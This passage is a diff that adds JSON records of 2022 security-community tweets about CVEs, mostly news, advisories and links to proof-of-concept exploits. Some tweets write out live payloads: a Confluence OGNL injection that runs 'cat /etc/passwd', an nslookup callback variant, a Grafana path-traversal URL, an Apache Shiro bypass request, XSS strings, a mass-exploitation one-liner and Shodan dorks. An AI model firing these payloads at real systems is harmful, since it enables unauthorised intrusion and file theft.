@@ -4740,3 +4740,2895 @@
     "tweeturl": "https://twitter.com/cyb3rops/status/1531884486341840897",
     "username": "cyb3rops"
 }
+{
+    "expanded_url": [
+        "https://github.co/3Oys62x"
+    ],
+    "tweetfavorites": 189,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "In this post @mmolgtm goes through the details of CVE-2022-1134, a type confusion in Chrome, and shows how to gain remote code execution in the Chrome renderer using this bug. https://t.co/T4643hqF08",
+    "tweettime": "2022-06-30, 09:31:14",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1542440614637223936",
+    "username": "GHSecurityLab"
+}
+{
+    "tweetfavorites": 201,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 51,
+    "tweettext": "1) CVE-2021-21042 to disclosure user32.dll's base addr.\n2) CVE-2019-7040 to get RCE.\n\nNo sbx, so protected mode is off. To be released soon... https://t.co/b3DiUxcdZW",
+    "tweettime": "2022-06-29, 18:23:23",
+    "tweeturl": "https://twitter.com/j00sean/status/1542212146313969665",
+    "username": "j00sean"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/red-team-blog-cve-2022-28219"
+    ],
+    "tweetfavorites": 739,
+    "tweetquotes": 17,
+    "tweetreplies": 6,
+    "tweetretweets": 268,
+    "tweettext": "Check out a recent finding by one of our own, Naveen Sunkavally. CVE-2022-28219 is an unauth RCE for ManageEngine ADAudit Plus. \n\nThis XXE -&gt; Deserialization chain often leads to host compromise as well as priv'd AD creds. Check out the blog post and POC: https://t.co/bLHzhvSnLo",
+    "tweettime": "2022-06-29, 13:24:35",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1542136953004609536",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 180,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 50,
+    "tweettext": "Apache Shiro CVE-2022-32532\nThis request can succeed\n\nGET /permit/any HTTP/1.1\nToken: momika\nAccess is not allowed when there is no token request header\n\nGET /permit/any HTTP/1.1\nIt can be bypassed in a simple way in special but common configurations\n\nGET /permit/a%0any HTTP/1.1",
+    "tweettime": "2022-06-29, 05:27:00",
+    "tweeturl": "https://twitter.com/momika233/status/1542016765030707206",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
+    ],
+    "tweetfavorites": 805,
+    "tweetquotes": 13,
+    "tweetreplies": 10,
+    "tweetretweets": 356,
+    "tweettext": "⚠️ Zimbra Mail pre-auth RCE via Path Traversal bug in unrar (CVE-2022-30333).  This is probably my most impactful bug so far, especially after Zimbra has been the target of a 0day campaign likely conducted by a state actor. More details in this blog post: https://t.co/8v0ujC1Nyl https://t.co/VZQm0NdqnU",
+    "tweettime": "2022-06-28, 15:06:05",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1541800107909185537",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-871/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "[ZDI-22-871|CVE-2022-30157] Microsoft SharePoint Chart Deserialization of Untrusted Data Remote Code Execution Vulnerability (CVSS 8.8) https://t.co/rVlmeQCu9b",
+    "tweettime": "2022-06-23, 15:50:18",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1539999296405356546",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit"
+    ],
+    "tweetfavorites": 422,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 170,
+    "tweettext": "💥 We have reproduced CVE-2022-31626, an RCE in PHP &lt;= 7.4.29 which can be triggered via a rogue MySQL/MariaDB server!\n\nIt's a Heap Overflow, works with MySQLi/PDO, and doesn't require LOAD LOCAL INFILE.\n\nThe PoC 👉 https://t.co/vrtniSEHhu https://t.co/ElJJgl5d9j",
+    "tweettime": "2022-06-23, 01:52:39",
+    "tweeturl": "https://twitter.com/ptswarm/status/1539788492695371778",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://github.com/kuron3k0/Spring-Data-Mongodb-Example"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 61,
+    "tweettext": "https://t.co/qmyC5hEBG5\nCVE-2022-22980: Spring Data MongoDB SpEL Expression injection vulnerability through annotated repository query methods https://t.co/jFv7mXtwdt",
+    "tweettime": "2022-06-21, 13:30:30",
+    "tweeturl": "https://twitter.com/momika233/status/1539239336558104576",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 177,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability (Part 1) https://t.co/2tNZ3gmi81",
+    "tweettime": "2022-06-21, 08:41:54",
+    "tweeturl": "https://twitter.com/reverseame/status/1539166711072624642",
+    "username": "reverseame"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "https://t.co/NtvlODMlQp\nCVE-2022-26809",
+    "tweettime": "2022-06-19, 13:46:03",
+    "tweeturl": "https://twitter.com/momika233/status/1538518477342130176",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 436,
+    "tweetquotes": 5,
+    "tweetreplies": 6,
+    "tweetretweets": 199,
+    "tweettext": "🧨 Windows RPC Critical Vulnerability (CVE-2022-26809)\n\nYou can search for vulnerable hosts in Shodan by dorks:\n\nport:445\n\nproduct:\"Microsoft RPC Endpoint Mapper\"\n\nLink to PoC https://t.co/AXQC2W0rmU\n\n#bugbountytips #CVE #cybersecurity #infosec #bugbounty https://t.co/r7uf5eWgji",
+    "tweettime": "2022-06-18, 20:01:12",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1538250496313413633",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/omair2084/CVE-2022-26937"
+    ],
+    "tweetfavorites": 451,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 162,
+    "tweettext": "From what was available online, a rough PoC for Windows NFS vulnerability (CVE-2022-26937). https://t.co/tk43aHWHpa https://t.co/KR1yibxLx7",
+    "tweettime": "2022-06-17, 01:52:53",
+    "tweeturl": "https://twitter.com/w3bd3vil/status/1537614224595501056",
+    "username": "w3bd3vil"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/15/cve-2022-23088-exploiting-a-heap-overflow-in-the-freebsd-wi-fi-stack"
+    ],
+    "tweetfavorites": 169,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 62,
+    "tweettext": "CVE-2022-23088: A new guest blog from @m00nbsd describes a 13-yr-old heap overflow in the Wi-Fi stack that allows network-adjacent attackers to execute code on affected installations of FreeBSD Kernel. Includes root cause &amp; PoC. Read the details at https://t.co/NPHu6jkiaa",
+    "tweettime": "2022-06-16, 16:39:20",
+    "tweeturl": "https://twitter.com/thezdi/status/1537474918627131392",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.co/3mWLcTP"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "In this blog post @mmolgtm shows how to bypass various modern mitigation implemented in the Android kernel and exploit CVE-2022-22057 to gain root from a malicious Android app https://t.co/4d4pMOxNgu",
+    "tweettime": "2022-06-16, 16:05:29",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1537466400578609152",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Volexity report detailing the exploitation of a Sophos firewall zero-day from earlier this year\n\nZero-day is tracked as CVE-2022-1040 and its exploitation was linked to \"DriftingCloud,\" a new APT that appears to be based in China\n\nhttps://t.co/NdMiOUsFkb https://t.co/U77hLLfadf",
+    "tweettime": "2022-06-16, 16:01:33",
+    "tweeturl": "https://twitter.com/campuscodi/status/1537465412807442432",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 14,
+    "tweettext": "Just scored 2 full-read SSRF bounties with this blog. Thank you @assetnote! Who do I send the beer to? 🍻\n\nTurning bad SSRF to good SSRF: Websphere Portal (CVE-2021-27748) -   https://t.co/iIlMtE874p",
+    "tweettime": "2022-06-16, 13:32:20",
+    "tweeturl": "https://twitter.com/systemDumb/status/1537427860209680384",
+    "username": "systemDumb"
+}
+{
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 25,
+    "tweettext": "🚒 Invision Community fixed an SSRF vulnerability (CVE-2021-40604) found by Mikhail Klyuchnikov!\n\nTimeline:\n✅ 06/23/2021 - The advisory is published\n😒 06/24/2021 - Requested CVE via MITRE\n😀 06/13/2022 - CVE was assigned\n\nThe PoC ⤵️\n\nThe \"gkey\" param is an unfollow token. https://t.co/jlvQwcm9QY",
+    "tweettime": "2022-06-16, 13:06:51",
+    "tweeturl": "https://twitter.com/ptswarm/status/1537421446946988036",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 43,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability https://t.co/Olq8qu8zpR",
+    "tweettime": "2022-06-16, 11:58:00",
+    "tweeturl": "https://twitter.com/pentest_swissky/status/1537404119127691267",
+    "username": "pentest_swissky"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/high-severity-rce-vulnerability.html"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 87,
+    "tweettext": "Researchers detail a recently reported high-severity #vulnerability (CVE-2022-25845) in the Fastjson library that could potentially be exploited for remote code execution attacks.\n\nRead: https://t.co/b0Gvl4lUhQ\n\n#infosec #sysadmin #DevOps #cybersecurity #hacking",
+    "tweettime": "2022-06-16, 08:29:26",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1537351630877696000",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-29149"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 11,
+    "tweetreplies": 3,
+    "tweetretweets": 70,
+    "tweettext": "OMI is back! @msftsecresponse published CVE-2022-29149, a new LPE vulnerability in OMI, the Azure agent that was vulnerable to #OMIGOD. Seems like manual update of the silently installed agent is required again in most cases \n\nhttps://t.co/Ga4hETg6i2",
+    "tweettime": "2022-06-15, 23:06:35",
+    "tweeturl": "https://twitter.com/41thexplorer/status/1537209987570847744",
+    "username": "41thexplorer"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 113,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 79,
+    "tweettext": ".@Volexity offers a case study on real-world #zeroday exploitation of a Sophos XG Firewall via CVE-2022-1040 by #DriftingCloud. Read about man-in-the-middle attacks, stolen session cookies, and how this APT moved beyond the firewall: https://t.co/3TthlXpXe8 #threatintel #dfir",
+    "tweettime": "2022-06-15, 18:44:47",
+    "tweeturl": "https://twitter.com/Volexity/status/1537144102218870784",
+    "username": "Volexity"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190"
+    ],
+    "tweetfavorites": 251,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "https://t.co/EZlw4Vr9dV The official patch for CVE-2022-30190 is released. Added regular filtering to the RunScript function, which means that this vulnerability turns into a game that tries to bypass https://t.co/WnFQaDB3Hv",
+    "tweettime": "2022-06-15, 03:55:12",
+    "tweeturl": "https://twitter.com/80vul/status/1536920233255968769",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/"
+    ],
+    "tweetfavorites": 236,
+    "tweetquotes": 6,
+    "tweetreplies": 5,
+    "tweetretweets": 110,
+    "tweettext": "CVE-2022-27924 allows an unauthenticated, remote attacker to dump clear-text creds from a Zimbra instance with default config. We used Memcache response injection to bypass restrictions. Apparently Zimbra is used by over 200.000. Patch now! https://t.co/7ziBH7G4ax",
+    "tweettime": "2022-06-14, 17:45:38",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1536766828491456514",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2022-25845 – Analyzing the Fastjson “Auto Type Bypass” RCE vulnerability https://t.co/eZSzQB2xIc",
+    "tweettime": "2022-06-14, 15:43:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1536735993889316864",
+    "username": "_r_netsec"
+}
+{
+    "tweetfavorites": 262,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 52,
+    "tweettext": "I create a custom nuclei template for mass hunting recent CVE-2022-29455(XSS)\n#bugbounty #nuclei https://t.co/uMC9ldy3CJ",
+    "tweettime": "2022-06-14, 04:54:33",
+    "tweeturl": "https://twitter.com/tamimhasan404/status/1536572780325392384",
+    "username": "tamimhasan404"
+}
+{
+    "expanded_url": [
+        "https://github.com/tr3ee/CVE-2022-23222"
+    ],
+    "tweetfavorites": 538,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 189,
+    "tweettext": "CVE-2022-23222: Linux kernel through 5.15.14 allows local users to gain privileges because of the availability of pointer arithmetic via certain *_OR_NULL pointer types.\n\nPoC\nhttps://t.co/zFAfB0UXg3 https://t.co/lBT5BLTO6w",
+    "tweettime": "2022-06-12, 07:47:27",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535891514387218432",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 479,
+    "tweetquotes": 6,
+    "tweetreplies": 7,
+    "tweetretweets": 184,
+    "tweettext": "CVE-2022-30075: Authenticated Remote Code Execution in Tp-Link Routers.\n\nPoC\nhttps://t.co/AGyD2CVWA8 https://t.co/qU87X48x39",
+    "tweettime": "2022-06-12, 07:45:12",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1535890951226462208",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://cert.gov.ua/article/160530"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 64,
+    "tweettext": "Attempted cyberattack/operation aimed at Ukrainian media organizations (radio stations, newspapers, news agencies, etc.). Suspected Sandworm group trying to exploit CVE-2022-30190 (fresh, remote code execution vulnerability via Office/Word) https://t.co/UtHWUvnwCk https://t.co/yznXpfh7Ys",
+    "tweettime": "2022-06-11, 15:20:47",
+    "tweeturl": "https://twitter.com/lukOlejnik/status/1535643213712830466",
+    "username": "lukOlejnik"
+}
+{
+    "expanded_url": [
+        "https://github.com/aaronsvk/CVE-2022-30075"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 101,
+    "tweettext": "Researcher releases PoC exploit for a new authenticated RCE #vulnerability (CVE-2022-30075) affecting Tp-Link routers.\n\nhttps://t.co/MwaPmYk9HG\n\n\"If your Tp-Link router has backup and restore functionality and firmware is older than june 2022, it is probably vulnerable\" https://t.co/GtXG37KzNf",
+    "tweettime": "2022-06-11, 13:50:11",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1535620414268899329",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6015b5npx"
+    ],
+    "tweetfavorites": 161,
+    "tweetquotes": 7,
+    "tweetreplies": 4,
+    "tweetretweets": 82,
+    "tweettext": "Multiple adversaries and nation-state actors, including DEV-0401 and DEV-0234, are taking advantage of the Atlassian Confluence RCE vulnerability CVE-2022-26134. We urge customers to upgrade to the latest version or apply recommended mitigations: https://t.co/C3CykQgrOJ",
+    "tweettime": "2022-06-11, 00:24:59",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1535417776290111489",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "I just wrote a technical analysis blog about Confluence CVE-2022-26134, especially focus on Confluence version 7.18.0 where isSafeExpression is introduced and different ways that you can bypass it :). If you have any questions, please dm me :)\nhttps://t.co/AqWJ11qko5",
+    "tweettime": "2022-06-10, 15:42:05",
+    "tweeturl": "https://twitter.com/mr_r3bot/status/1535286185358401536",
+    "username": "mr_r3bot"
+}
+{
+    "tweetfavorites": 112,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2022-31402 iTop 3.0.1 XSS Vulnerability\n\nhttp://localhost/itop/webservices/export-v2.php\"()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;N8Zn(9266)&lt;/ScRiPt&gt;",
+    "tweettime": "2022-06-10, 04:36:33",
+    "tweeturl": "https://twitter.com/momika233/status/1535118697466953728",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/7/cve-2022-26937-microsoft-windows-network-file-system-nlm-portmap-stack-buffer-overflow"
+    ],
+    "tweetfavorites": 155,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 77,
+    "tweettext": "The latest blog from the Trend Micro Research Team looks at CVE-2022-26937: a Microsoft Windows NFS NLM Portmap stack buffer overflow that could lead to RCE. They provide root cause, source code walkthrough, and detection guidance. https://t.co/FhKhIeoG35",
+    "tweettime": "2022-06-08, 14:27:58",
+    "tweeturl": "https://twitter.com/thezdi/status/1534542758991511557",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "CVE-2022-1588 Contao 4.13.2 Cross-Site Scripting (XSS)\nURL: https://localhost/contao/\"&gt;&lt;svg//onload=alert('momika233')&gt;",
+    "tweettime": "2022-06-08, 01:39:15",
+    "tweeturl": "https://twitter.com/momika233/status/1534349304688967680",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 146,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 47,
+    "tweettext": "#CVE-2022-26134 Atlassian Confluence RCE \n\nboolean authenticate(String username, String password) https://t.co/rXZbj7pk70",
+    "tweettime": "2022-06-07, 13:47:09",
+    "tweeturl": "https://twitter.com/jas502n/status/1534170095932821504",
+    "username": "jas502n"
+}
+{
+    "tweetfavorites": 921,
+    "tweetquotes": 10,
+    "tweetreplies": 22,
+    "tweetretweets": 304,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd",
+    "tweettime": "2022-06-07, 09:30:36",
+    "tweeturl": "https://twitter.com/momika233/status/1534105534793920512",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1913/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 7,
+    "tweettext": "\"CVE-2022-30190 MSDT PowerShell Code Injection Vulnerability Analysis\" https://t.co/ViRj51xWLf (Chinese) by HuanGMz@KnownSec  404 Team . The original model of the vulnerability is code injection caused by the lack of filtering $ in the .AddScript() function parameter. https://t.co/Cbz3VnMbKI",
+    "tweettime": "2022-06-07, 06:29:54",
+    "tweeturl": "https://twitter.com/80vul/status/1534060061869285377",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/blog/observed-in-the-wild-atlassian-confluence-server-cve-2022-26134"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "800+ unique IPs and counting... read fresh insights from our research team on zero-day vulnerability Atlassian Confluence CVE-2022-26134. https://t.co/dvG31gk1xv",
+    "tweettime": "2022-06-06, 22:38:29",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1533941426320310272",
+    "username": "GreyNoiseIO"
+}
+{
+    "expanded_url": [
+        "https://www.mozilla.org/en-US/security/bug-bounty/hall-of-fame/"
+    ],
+    "tweetfavorites": 82,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Got a spot in Mozilla Hall of Fame (1st Quarter 2022) by reporting CVE-2022-26381 (Mozilla Firefox textPath Element Use-After-Free Remote Code Execution Vulnerability):\nhttps://t.co/RKW4yefPVL",
+    "tweettime": "2022-06-06, 21:44:06",
+    "tweeturl": "https://twitter.com/hosselot/status/1533927736888238090",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32275"
+    ],
+    "tweetfavorites": 333,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 103,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI. https://t.co/1LMJnFOkbZ",
+    "tweettime": "2022-06-06, 19:45:23",
+    "tweeturl": "https://twitter.com/CVEnew/status/1533897860583931905",
+    "username": "CVEnew"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 38,
+    "tweettext": "Technical Analysis and Exploitation of CVE-2022-26134, critical unauthenticated RCE in Confluence, by @rapid7  \n\nhttps://t.co/3xQzizl2ko\n\n#infosec #cybersecurity #bugbounty #pentest https://t.co/Mi65pQKUaL",
+    "tweettime": "2022-06-06, 19:00:09",
+    "tweeturl": "https://twitter.com/payloadartist/status/1533886478291714049",
+    "username": "payloadartist"
+}
+{
+    "tweetfavorites": 284,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 94,
+    "tweettext": "🦥 Everyone learned to run pip install colorama to exploit Atlassian Confluence RCE (CVE-2022-26134), so let’s see how the vulnerability works under the hood.\n\nHere we show our simplified payload which demonstrates a workflow inside the vulnerable code ⤵️ https://t.co/szijIM84hd",
+    "tweettime": "2022-06-06, 13:37:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1533805332409069568",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/v56qin/cve202226134_confluence_zero_day_remote_code/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "/r/blueteamsec are now running one of our now (infamous?) threads on CVE-2022-26134 aka the Confluence Zero Day - with technical analysis, exploits, active exploitation updates, detections and more.. \n\nhttps://t.co/dHEkcymrkf",
+    "tweettime": "2022-06-06, 10:58:21",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1533765228072148994",
+    "username": "ollieatnccgroup"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134?fbclid=IwAR0tZiWJjBJHu5slC4ZUfGK00Bew8tbp2xCLrQvD0uZjkPLOvFUvzhmWtbE"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "CVE-2022-26134 Atlassian\n\n${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"cat /etc/passwd\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}\n\nhttps://t.co/nrwWLejKgW https://t.co/YO1WzL9MJV",
+    "tweettime": "2022-06-06, 06:36:43",
+    "tweeturl": "https://twitter.com/wugeej/status/1533699386542534662",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://viz.greynoise.io/query/?gnql=tags%3A%22Atlassian%20Confluence%20Server%20CVE-2022-26134%20OGNL%20Injection%20Attempt%22"
+    ],
+    "tweetfavorites": 168,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 84,
+    "tweettext": "Widespread Atlassian Confluence CVE-2022-26134 exploitation, specifically that is *confirmed functional*, has just started. 23 unique IPs so far.\n\n-Tags available to all @GreyNoiseIO users now\n- Create an account to deploy a dynamic block list to block it\n\nhttps://t.co/dbXTw2LWY6 https://t.co/xXldngWdPH",
+    "tweettime": "2022-06-04, 17:31:37",
+    "tweeturl": "https://twitter.com/Andrew___Morris/status/1533139425122713600",
+    "username": "Andrew___Morris"
+}
+{
+    "tweetfavorites": 168,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 47,
+    "tweettext": "Confluence RCE (CVE-2022-26134)\nPoc:\n\n{{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/",
+    "tweettime": "2022-06-04, 11:44:13",
+    "tweeturl": "https://twitter.com/S0ufi4n3/status/1533051998077067267",
+    "username": "S0ufi4n3"
+}
+{
+    "tweetfavorites": 366,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 108,
+    "tweettext": "CVE-2022-26134  Confluence RCE exploit automation :\n\nhttpx -l list.txt  -paths path.txt  -match-string \"gid=\"",
+    "tweettime": "2022-06-04, 10:00:04",
+    "tweeturl": "https://twitter.com/h4x0r_dz/status/1533025788672593920",
+    "username": "h4x0r_dz"
+}
+{
+    "tweetfavorites": 397,
+    "tweetquotes": 3,
+    "tweetreplies": 10,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2022-26134: Atlassian Confluence RCE PoC\n\n#BugBounty https://t.co/7UFw7TkwME",
+    "tweettime": "2022-06-04, 06:02:51",
+    "tweeturl": "https://twitter.com/sheikhrishad0/status/1532966090841915392",
+    "username": "sheikhrishad0"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 192,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 64,
+    "tweettext": "Atlassian Confluence (CVE-2022-26134) - Unauthenticated Remote Code Execution (RCE)\nURL：https://t.co/OXIOSvXHL4",
+    "tweettime": "2022-06-04, 04:24:06",
+    "tweeturl": "https://twitter.com/momika233/status/1532941237405499392",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 475,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 152,
+    "tweettext": "Thread - Confluence Blind OGNL Injection analysis from our limited java knowledge. From vulnerable sink to becoming admin of the confluence instance. #CVE-2022-26134. Tested on latest vulnerable version 7.18.0.",
+    "tweettime": "2022-06-04, 03:16:31",
+    "tweeturl": "https://twitter.com/httpvoid0x2f/status/1532924231054499840",
+    "username": "httpvoid0x2f"
+}
+{
+    "expanded_url": [
+        "https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134"
+    ],
+    "tweetfavorites": 562,
+    "tweetquotes": 8,
+    "tweetreplies": 2,
+    "tweetretweets": 200,
+    "tweettext": "Very simple POC for Atlassian Confluence Pre-Auth OGNL Injection &amp;&amp; RCE (CVE-2022-26134)\nSetup a pre-built environment to test it in 5 seconds: https://t.co/oH6GJ1mel1\nWhy 5 minutes not 10 seconds? Because you should apply a trial license from Atlassian😂#vulhub https://t.co/CS1EVOHbKg",
+    "tweettime": "2022-06-04, 00:50:44",
+    "tweeturl": "https://twitter.com/phithon_xg/status/1532887542722269184",
+    "username": "phithon_xg"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
